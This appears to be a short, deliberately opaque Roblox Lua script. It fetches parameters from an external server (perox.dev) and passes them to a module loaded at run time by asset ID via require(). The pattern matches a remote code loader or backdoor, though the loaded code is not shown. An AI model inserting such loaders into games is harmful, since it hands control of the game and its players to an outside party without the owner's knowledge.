local ab = game:GetService("HttpService")
local ba = 16542686427
local cb = ab:GetAsync("https://perox.dev/rblxContent/GifModule/download/a.json")
local bc = ab:JSONDecode(cb)
local dc = bc.a
local cd = bc.b
require(ba).open(dc, cd)
